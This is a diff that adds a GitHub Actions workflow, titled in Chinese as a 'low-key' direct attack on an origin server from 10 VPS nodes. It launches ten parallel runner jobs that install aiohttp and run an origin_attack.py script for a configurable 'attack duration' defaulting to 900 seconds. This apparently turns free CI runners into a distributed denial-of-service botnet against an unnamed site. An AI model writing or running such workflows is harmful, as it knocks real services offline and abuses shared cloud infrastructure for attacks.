@@ -1,0 +1,37 @@
+name: "源站直攻 10 VPS 低调版"
+
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: '攻击持续时间(秒)'
+        required: false
+        default: '900'
+        type: string
+
+jobs:
+  attack:
+    name: "OG-${{ matrix.node_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 18
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        node_id: [1,2,3,4,5,6,7,8,9,10]
+    
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - name: Install aiohttp
+        run: pip install aiohttp
+      - name: Attack
+        run: python3 origin_attack.py
+        env:
+          DURATION: ${{ github.event.inputs.duration || '900' }}
+          WORKERS: ${{ github.event.inputs.workers || '50' }}
+          NODE_ID: ${{ matrix.node_id }}
